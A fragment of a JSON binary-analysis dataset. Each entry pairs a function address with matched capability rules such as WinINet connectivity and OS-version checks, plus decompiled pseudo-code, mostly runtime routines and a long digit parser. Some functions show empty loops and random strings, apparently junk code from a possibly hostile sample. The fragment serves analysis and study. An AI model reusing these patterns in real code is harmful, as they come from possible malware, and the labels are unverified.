            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040202c(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack60;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451260;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack60 = 4; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"qhteb\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 211
    },
    "00402077": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402077(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 299
    },
    "004020a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004020a9(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int16_t *piVar4;\n    \n    if (arg_8h != NULL) {\n        piVar4 = arg_8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iVar3 = (piVar4 - (arg_8h + 1) >> 1) + 1;\n        arg_8h_00 = fcn.00401596(iVar3 * 2);\n        if (arg_8h_00 != 0) {\n            iVar3 = fcn.00403977(arg_8h_00, iVar3, arg_8h);\n            if (iVar3 == 0) {\n                return arg_8h_00;\n            }\n            fcn.0040366b(0, 0, 0, 0, 0);\n            pcVar2 = swi(3);\n            iVar3 = (*pcVar2)();\n            return iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "004020bd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004020bd(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.0040549d(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.0040549d(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 398
    },
    "00402199": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402199(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((*(param_1 + 0x1c) != 0) && (*(param_1 + 0x1c) != 7)) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 106
    },
    "00402207": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00402207(uint32_t *arg_8h, ushort *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (arg_ch == NULL) {\n        if (arg_10h != 0) {\ncode_r0x004d43b7:\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            return 0x16;\n        }\n    }\n    else if (arg_10h == 0) goto code_r0x004d43b7;\n    if (arg_ch != NULL) {\n        *arg_ch = 0;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = 0;\n    }\n    fcn.004058a8(arg_1ch);\n    uVar3 = arg_10h;\n    if (arg_18h <= arg_10h) {\n        uVar3 = arg_18h;\n    }\n    if (uVar3 < 0x80000000) {\n        iVar2 = fcn.004d4149(arg_ch, arg_14h, uVar3, &var_ch);\n        if (iVar2 == -1) {\n            if (arg_ch != NULL) {\n                *arg_ch = 0;\n            }\n            puVar1 = fcn.00403a35();\n            uVar4 = *puVar1;\n            goto code_r0x004d442a;\n        }\n        uVar3 = iVar2 + 1;\n        if (arg_ch != NULL) {\n            if (arg_10h < uVar3) {\n                if (arg_18h != 0xffffffff) {\n                    *arg_ch = 0;\n                    puVar1 = fcn.00403a35();\n                    uVar4 = 0x22;\n                    goto code_r0x004d440b;\n                }\n                uVar4 = 0x50;\n                uVar3 = arg_10h;\n            }\n            arg_ch[uVar3 - 1] = 0;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = uVar3;\n        }\n    }\n    else {\n        puVar1 = fcn.00403a35();\n        uVar4 = 0x16;\ncode_r0x004d440b:\n        *puVar1 = uVar4;\n        fcn.004037ce();\n    }\ncode_r0x004d442a:\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar4;\n}\n",
        "token_count": 685
    },
    "0040224d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040224d(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX[8] == 0) || (piVar1 = in_ECX[0xc],  *piVar1 < 1)) {\n        pcVar3 = *(*in_ECX + 0xc);\n        (**0x578000)(arg_8h);\n        arg_8h = (*pcVar3)();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *in_ECX[8];\n        *in_ECX[8] = puVar2 + 1;\n        *puVar2 = arg_8h;\n    }\n    return arg_8h & 0xffff;\n}\n",
        "token_count": 200
    },
    "0040228e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040228e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0x22; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&stack0x00000010, &stack0x00000028, &stack0x00000054, iVar1, *0x546b28);\n    fcn.00403b02();\n    fcn.00403b02();\n    return 0xbdff;\n}\n",
        "token_count": 123
    },
    "00402374": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402374(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00401e79(\"lkqarcqmnoakrknlbkprbthjmtvrabndsyfgnagdwnrttlthvqwdm\");\n    for (iVar1 = 0x20; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02();\n    return 0xf2a4;\n}\n",
        "token_count": 125
    },
    "004023ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004023ce(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (arg_8h != 0) {\n        iVar1 = fcn.0040528b(8);\n        if (iVar1 == 0) {\n            *in_ECX = 0;\n        }\n        else {\n            iVar1 = fcn.00403995(arg_8h);\n            *in_ECX = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n    }\n    *(in_ECX + 1) = 3;\n    return;\n}\n",
        "token_count": 166
    },
    "00402432": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402432(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 240
    },
    "00402464": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402464(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00402522": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00402522(int32_t *arg_8h, uint16_t **arg_ch, int32_t *arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t uVar9;\n    int32_t *piVar10;\n    uint16_t *puVar11;\n    uint16_t uVar12;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint16_t *var_14h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    char var_2h;\n    uint var_1h;\n    \n    cVar3 = fcn.00402630();\n    if (cVar3 == '\\0') {\n        return 7;\n    }\n    puVar11 = *arg_ch;\n    uVar12 = *puVar11;\n    puVar8 = puVar11;\n    while( true ) {\n        var_8h = var_8h & 0xffff0000 | uVar12;\n        *arg_ch = puVar8 + 1;\n        iVar5 = fcn.00402162(uVar12, 8);\n        if (iVar5 == 0) break;\n        puVar8 = *arg_ch;\n        uVar12 = *puVar8;\n    }\n    piVar10 = arg_10h + 0xc2;\n    *piVar10 = var_8h == 0x2d;\n    if ((var_8h == 0x2d) || (var_8h == 0x2b)) {\n        var_8h._0_2_ = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | var_8h;\n        *arg_ch = *arg_ch + 1;\n    }\n    if ((var_8h == 0x49) || (var_8h == 0x69)) {\n        uVar6 = fcn.00405afb(&var_8h, arg_ch, puVar11);\n        return uVar6;\n    }\n    if ((var_8h == 0x4e) || (var_8h == 0x6e)) {\n        uVar6 = fcn.004050a6(&var_8h, arg_ch, puVar11);\n        return uVar6;\n    }\n    var_ch = 0;\n    var_1h._0_1_ = 0;\n    var_14h = puVar11;\n    if (var_8h == 0x30) {\n        var_14h = *arg_ch;\n        uVar6 = *var_14h;\n        *arg_ch = var_14h + 1;\n        if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n            var_8h._0_2_ = var_14h[1];\n            var_1h._0_1_ = 1;\n            var_8h = var_8h & 0xffff0000 | var_8h;\n            *arg_ch = var_14h + 2;\n        }\n        else {\n            fcn.00402f04(uVar6);\n            var_14h = puVar11;\n        }\n    }\n    var_10h = arg_10h + 2;\n    var_18h = 0;\n    var_2h = '\\0';\n    if (var_8h == 0x30) {\n        var_2h = '\\x01';\n        do {\n            var_8h._0_2_ = **arg_ch;\n            var_8h = var_8h & 0xffff0000 | var_8h;\n            *arg_ch = *arg_ch + 1;\n        } while (var_8h == 0x30);\n    }\n    uVar6 = ((var_1h == 0) - 1 & 6) + 9;\n    do {\n        if (var_8h < 0x30) goto code_r0x004b5376;\n        if (var_8h < 0x3a) {\n            uVar7 = var_8h - 0x30;\ncode_r0x004b5371:\n            if (uVar7 == 0xffffffff) goto code_r0x004b5376;\n        }\n        else {\n            if (0xff0f < var_8h) {\n                if (var_8h < 0xff1a) {\n                    uVar7 = var_8h - 0xff10;\n                }\n                else {\n                    uVar7 = 0xffffffff;\n                }\n                goto code_r0x004b5371;\n            }\n            if (0x65f < var_8h) {\n                if (var_8h < 0x66a) {\n                    uVar7 = var_8h - 0x660;\n                }\n                else {\n                    if (var_8h < 0x6f0) goto code_r0x004b5376;\n                    if (var_8h < 0x6fa) {\n                        uVar7 = var_8h - 0x6f0;\n                    }\n                    else {\n                        if (var_8h < 0x966) goto code_r0x004b5376;\n                        if (var_8h < 0x970) {\n                            uVar7 = var_8h - 0x966;\n                        }\n                        else {\n                            if (var_8h < 0x9e6) goto code_r0x004b5376;\n                            if (var_8h < 0x9f0) {\n                                uVar7 = var_8h - 0x9e6;\n                            }\n                            else {\n                                if (var_8h < 0xa66) goto code_r0x004b5376;\n                                if (var_8h < 0xa70) {\n                                    uVar7 = var_8h - 0xa66;\n                                }\n                                else {\n                                    if (var_8h < 0xae6) goto code_r0x004b5376;\n                                    if (var_8h < 0xaf0) {\n                                        uVar7 = var_8h - 0xae6;\n                                    }\n                                    else {\n                                        if (var_8h < 0xb66) goto code_r0x004b5376;\n                                        if (var_8h < 0xb70) {\n                                            uVar7 = var_8h - 0xb66;\n                                        }\n                                        else {\n                                            if (var_8h < 0xc66) goto code_r0x004b5376;\n                                            if (var_8h < 0xc70) {\n                                                uVar7 = var_8h - 0xc66;\n                                            }\n                                            else {\n                                                if (var_8h < 0xce6) goto code_r0x004b5376;\n                                                if (var_8h < 0xcf0) {\n                                                    uVar7 = var_8h - 0xce6;\n                                                }\n                                                else {\n                                                    if (var_8h < 0xd66) goto code_r0x004b5376;\n                                                    if (var_8h < 0xd70) {\n                                                        uVar7 = var_8h - 0xd66;\n                                                    }\n                                                    else {\n                                                        if (var_8h < 0xe50) goto code_r0x004b5376;\n                                                        if (var_8h < 0xe5a) {\n                                                            uVar7 = var_8h - 0xe50;\n                                                        }\n                                                        else {\n                                                            if (var_8h < 0xed0) goto code_r0x004b5376;\n                                                            if (var_8h < 0xeda) {\n                                                                uVar7 = var_8h - 0xed0;\n                                                            }\n                                                            else {\n                                                                if (var_8h < 0xf20) goto code_r0x004b5376;\n                                                                if (var_8h < 0xf2a) {\n                                                                    uVar7 = var_8h - 0xf20;\n                                                                }\n                                                                else {\n                                                                    if (var_8h < 0x1040) goto code_r0x004b5376;\n                                                                    if (var_8h < 0x104a) {\n                                                                        uVar7 = var_8h - 0x1040;\n                                                                    }\n                                                                    else {\n                                                                        if (var_8h < 0x17e0) goto code_r0x004b5376;\n                                                                        if (var_8h < 0x17ea) {\n                                                                            uVar7 = var_8h - 0x17e0;\n                                                                        }\n                                                                        else {\n                                                                            if ((var_8h < 0x1810) || (0x1819 < var_8h))\n                                                                            goto code_r0x004b5376;\n                                                                            uVar7 = var_8h - 0x1810;\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                goto code_r0x004b5371;\n            }\ncode_r0x004b5376:\n            uVar7 = var_8h;\n            if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                uVar7 = 0xffffffff;\n            }\n            else {\n                if (uVar7 - 0x61 < 0x1a) {\n                    uVar7 = uVar7 - 0x20;\n                }\n                uVar7 = uVar7 - 0x37;\n            }\n        }\n        if (uVar6 < uVar7) goto code_r0x004b53c8;\n        var_2h = '\\x01';\n        if (var_10h != piVar10) {\n            *var_10h = uVar7;\n            var_10h = var_10h + 1;\n        }\n        var_18h = var_18h + 1;\n        var_8h._0_2_ = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | var_8h;\n        *arg_ch = *arg_ch + 1;\n    } while( true );\ncode_r0x004b5973:\n    var_ch = 0x1451;\ncode_r0x004b5980:\n    do {\n        uVar9 = uVar7;\n        if (uVar9 < 0x30) goto code_r0x004b5bd1;\n        if (uVar9 < 0x3a) {\n            uVar6 = uVar7 - 0x30;\ncode_r0x004b5bcc:\n            if (uVar6 == 0xffffffff) goto code_r0x004b5bd1;\n        }\n        else {\n            if (0xff0f < uVar9) {\n                if (uVar9 < 0xff1a) {\n                    uVar6 = uVar7 - 0xff10;\n                }\n                else {\n                    uVar6 = 0xffffffff;\n                }\n                goto code_r0x004b5bcc;\n            }\n            if (0x65f < uVar9) {\n                if (uVar9 < 0x66a) {\n                    uVar6 = uVar7 - 0x660;\n                }\n                else {\n                    if (uVar9 < 0x6f0) goto code_r0x004b5bd1;\n                    if (uVar9 < 0x6fa) {\n                        uVar6 = uVar7 - 0x6f0;\n                    }\n                    else {\n                        if (uVar9 < 0x966) goto code_r0x004b5bd1;\n                        if (uVar9 < 0x970) {\n                            uVar6 = uVar7 - 0x966;\n                        }\n                        else {\n                            if (uVar9 < 0x9e6) goto code_r0x004b5bd1;\n                            if (uVar9 < 0x9f0) {\n                                uVar6 = uVar7 - 0x9e6;\n                            }\n                            else {\n                                if (uVar9 < 0xa66) goto code_r0x004b5bd1;\n                                if (uVar9 < 0xa70) {\n                                    uVar6 = uVar7 - 0xa66;\n                                }\n                                else {\n                                    if (uVar9 < 0xae6) goto code_r0x004b5bd1;\n                                    if (uVar9 < 0xaf0) {\n                                        uVar6 = uVar7 - 0xae6;\n                                    }\n                                    else {\n                                        if (uVar9 < 0xb66) goto code_r0x004b5bd1;\n                                        if (uVar9 < 0xb70) {\n                                            uVar6 = uVar7 - 0xb66;\n                                        }\n                                        else {\n                                            if (uVar9 < 0xc66) goto code_r0x004b5bd1;\n                                            if (uVar9 < 0xc70) {\n                                                uVar6 = uVar7 - 0xc66;\n                                            }\n                                            else {\n                                                if (uVar9 < 0xce6) goto code_r0x004b5bd1;\n                                                if (uVar9 < 0xcf0) {\n                                                    uVar6 = uVar7 - 0xce6;\n                                                }\n                                                else {\n                                                    if (uVar9 < 0xd66) goto code_r0x004b5bd1;\n                                                    if (uVar9 < 0xd70) {\n                                                        uVar6 = uVar7 - 0xd66;\n                                                    }\n                                                    else {\n                                                        if (uVar9 < 0xe50) goto code_r0x004b5bd1;\n                                                        if (uVar9 < 0xe5a) {\n                                                            uVar6 = uVar7 - 0xe50;\n                                                        }\n                                                        else {\n                                                            if (uVar9 < 0xed0) goto code_r0x004b5bd1;\n                                                            if (uVar9 < 0xeda) {\n                                                                uVar6 = uVar7 - 0xed0;\n                                                            }\n                                                            else {\n                                                                if (uVar9 < 0xf20) goto code_r0x004b5bd1;\n                                                                if (uVar9 < 0xf2a) {\n                                                                    uVar6 = uVar7 - 0xf20;\n                                                                }\n                                                                else {\n                                                                    if (uVar9 < 0x1040) goto code_r0x004b5bd1;\n                                                                    if (uVar9 < 0x104a) {\n                                                                        uVar6 = uVar7 - 0x1040;\n                                                                    }\n                                                                    else {\n                                                                        if (uVar9 < 0x17e0) goto code_r0x004b5bd1;\n                                                                        if (uVar9 < 0x17ea) {\n                                                                            uVar6 = uVar7 - 0x17e0;\n                                                                        }\n                                                                        else {\n                                                                            if ((uVar9 < 0x1810) || (0x1819 < uVar9))\n                                                                            goto code_r0x004b5bd1;\n                                                                            uVar6 = uVar7 - 0x1810;\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                goto code_r0x004b5bcc;\n            }\ncode_r0x004b5bd1:\n            if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                uVar6 = 0xffffffff;\n            }\n            else {\n                if (uVar7 - 0x61 < 0x1a) {\n                    uVar7 = uVar7 - 0x20;\n                }\n                uVar6 = uVar7 - 0x37;\n            }\n        }\n        if (9 < uVar6) break;\n        uVar9 = **arg_ch;\n        uVar7 = uVar9;\n        var_8h = var_8h & 0xffff0000 | uVar9;\n        *arg_ch = *arg_ch + 1;\n    } while( true );\n    if (uVar12 == 0x2d) {\n        var_ch = -var_ch;\n    }\n    iVar5 = var_ch;\n    if (!bVar1) {\n        fcn.00402f04(var_8h);\n        *arg_ch = puVar11;\n        var_8h = var_8h & 0xffff0000 | *puVar11;\n        *arg_ch = puVar8;\n    }\n    goto code_r0x004b5c49;\ncode_r0x004b53c8:\n    if (var_8h == ***(*arg_8h + 0x88)) {\n        puVar11 = *arg_ch + 1;\n        uVar12 = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | uVar12;\n        *arg_ch = puVar11;\n        if ((var_10h == arg_10h + 2) && (uVar12 == 0x30)) {\n            var_2h = '\\x01';\n            do {\n                uVar12 = *puVar11;\n                var_18h = var_18h + -1;\n                puVar11 = puVar11 + 1;\n                var_8h = var_8h & 0xffff0000 | uVar12;\n                *arg_ch = puVar11;\n            } while (uVar12 == 0x30);\n        }\n        do {\n            iVar5 = 0x30;\n            if (uVar12 < 0x30) {\ncode_r0x004b55d7:\n                uVar7 = uVar12;\n                if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                    uVar7 = 0xffffffff;\n                }\n                else {\n                    if (uVar7 - 0x61 < 0x1a) {\n                        uVar7 = uVar7 - 0x20;\n                    }\n                    uVar7 = uVar7 - 0x37;\n                }\n            }\n            else {\n                if (uVar12 < 0x3a) {\ncode_r0x004b545c:\n                    uVar7 = uVar12 - iVar5;\n                }\n                else {\n                    iVar5 = 0xff10;\n                    if (uVar12 < 0xff10) {\n                        iVar5 = 0x660;\n                        if ((uVar12 < 0x660) ||\n                           ((0x669 < uVar12 &&\n                            ((iVar5 = 0x6f0,  uVar12 < 0x6f0 ||\n                             ((0x6f9 < uVar12 &&\n                              ((iVar5 = 0x966,  uVar12 < 0x966 ||\n                               ((0x96f < uVar12 &&\n                                ((iVar5 = 0x9e6,  uVar12 < 0x9e6 ||\n                                 ((0x9ef < uVar12 &&\n                                  ((iVar5 = 0xa66,  uVar12 < 0xa66 ||\n                                   ((0xa6f < uVar12 &&\n                                    ((iVar5 = 0xae6,  uVar12 < 0xae6 ||\n                                     ((0xaef < uVar12 &&\n                                      ((iVar5 = 0xb66,  uVar12 < 0xb66 ||\n                                       ((0xb6f < uVar12 &&\n                                        ((iVar5 = 0xc66,  uVar12 < 0xc66 ||\n                                         ((0xc6f < uVar12 &&\n                                          ((iVar5 = 0xce6,  uVar12 < 0xce6 ||\n                                           ((0xcef < uVar12 &&\n                                            ((iVar5 = 0xd66,  uVar12 < 0xd66 ||\n                                             ((0xd6f < uVar12 &&\n                                              ((iVar5 = 0xe50,  uVar12 < 0xe50 ||\n                                               ((0xe59 < uVar12 &&\n                                                ((iVar5 = 0xed0,  uVar12 < 0xed0 ||\n                                                 ((0xed9 < uVar12 &&\n                                                  ((iVar5 = 0xf20,  uVar12 < 0xf20 ||\n                                                   ((0xf29 < uVar12 &&\n                                                    ((iVar5 = 0x1040,  uVar12 < 0x1040 ||\n                                                     ((0x1049 < uVar12 &&\n                                                      ((iVar5 = 0x17e0,  uVar12 < 0x17e0 ||\n                                                       ((0x17e9 < uVar12 &&\n                                                        ((iVar5 = 0x1810,  uVar12 < 0x1810 || (0x1819 < uVar12))))))))))\n                                                    ))))))))))))))))))))))))))))))))))))))))))))))))))))\n                        goto code_r0x004b55d7;\n                        goto code_r0x004b545c;\n                    }\n                    if (uVar12 < 0xff1a) goto code_r0x004b545c;\n                    uVar7 = 0xffffffff;\n                }\n                if (uVar7 == 0xffffffff) goto code_r0x004b55d7;\n            }\n            if (uVar6 < uVar7) break;\n            var_2h = '\\x01';\n            if (var_10h != piVar10) {\n                *var_10h = uVar7;\n                var_10h = var_10h + 1;\n            }\n            uVar12 = **arg_ch;\n            *arg_ch = *arg_ch + 1;\n            var_8h = var_8h & 0xffff0000 | uVar12;\n        } while( true );\n    }\n    fcn.00402f04(var_8h);\n    if (var_2h == '\\0') 